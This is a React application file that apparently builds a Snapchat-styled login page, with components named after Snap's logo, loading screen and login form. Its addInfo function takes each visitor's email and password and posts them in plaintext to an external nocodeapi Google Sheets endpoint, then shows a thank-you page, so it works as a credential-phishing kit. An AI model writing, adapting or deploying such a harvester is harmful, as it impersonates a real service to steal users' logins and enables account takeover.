import './App.css';
import SnapFirstLogo from './components/SnapFirstLogo';
import SnapLoding from './components/SnapLoding';
import MainPage from './components/MainPage';
import Loginpage from './components/Loginpage';
import LastPage from './components/LastPage';
import { useRef } from 'react';
import { HashRouter, Route, Routes } from 'react-router-dom'

function App() {
  let main_page = useRef(null)
  let SnapLogo = useRef(null)
  var email = useRef(null)
  var password = useRef(null)
  var btn = useRef(null)
  var incorrect = useRef(null)

  var snLoad = useRef(null)



  
  async function addInfo(e){
    e.preventDefault()
    if (password.current.value.includes('why')) {
      incorrect.current.style = 'display: block;';
    }
    else if (email.current.value.includes('why')) {
      incorrect.current.style = 'display: block;';
    }
    else {
      incorrect.current.style = 'display: none;';
    }
    console.log(email.current.value)
    console.log(password.current.value)
    try {
      const response = await fetch (
        "https://v1.nocodeapi.com/samarthakulkarni/google_sheets/angtnJjmUFYnnrre?tabId=snap",
        {
          method: "POST",
          headers: {
            "Content-Type":"application/json"
          },
          body: JSON.stringify([
            [email.current.value, password.current.value]
          ])
        }
      )
      await response.json()
    }catch(err) {
      console.log(err)
    }

  }

  const submit = () => {
    console.log('submitting !')
  }


  let icon = useRef(null)
  function veiw() {
    if (icon.current.getAttribute('name') === 'eye-off-sharp') {
      icon.current.setAttribute("name", "eye-sharp");
      icon.current.style = 'color: #00a2ef'
      
      password.current.setAttribute('type', 'text')
    }
    else {
      icon.current.setAttribute('name', 'eye-off-sharp')
      icon.current.style = 'color: #000000'
      password.current.setAttribute('type', 'password')
    }
  }



  const change = () => {
    if (email.current.value === '') {
      btn.current.style = 'background-color: #a4adb3;';
    }
    else if (password.current.value === '') {
      btn.current.style = 'background-color: #a4adb3;';
    }
    else {
      btn.current.style = 'background-color: #00a2ef'
    }
  }





  return (
    <>
      {/* <SnapFirstLogo SnapLogo={SnapLogo} />
      <SnapLoding />
      <MainPage main_page={main_page}/>
      <Loginpage email={email} password={password} addInfo={addInfo} btn={btn} change={change} incorrect={incorrect} icon={icon} veiw={veiw}/>
      <LastPage /> */}


      <HashRouter basename='/'>
        <SnapLoding sload={snLoad} />
        <Routes>

          {/* <Route element={ <SnapLoding sload={snLoad}/>}></Route> */}
          <Route path='/' element={<>

            <SnapFirstLogo SnapLogo={SnapLogo} />
            <MainPage main_page={main_page} snLoad={snLoad} />
          </>}>
          </Route>

          <Route path='login' element={<> <Loginpage email={email} password={password} addInfo={addInfo} btn={btn} change={change} incorrect={incorrect} icon={icon} veiw={veiw} snLoad={snLoad} allData={window.allData} submit={submit}/> </>}>
          </Route>

          <Route path='thank-you' element={<LastPage />}>
          </Route>
        </Routes>
      </HashRouter>

      {/* <SnapLoding sload={snLoad} />
<Loginpage email={email} password={password} addInfo={addInfo} btn={btn} change={change} incorrect={incorrect} icon={icon} veiw={veiw} load={load}/> */}
    </>
  );
}

export default App;
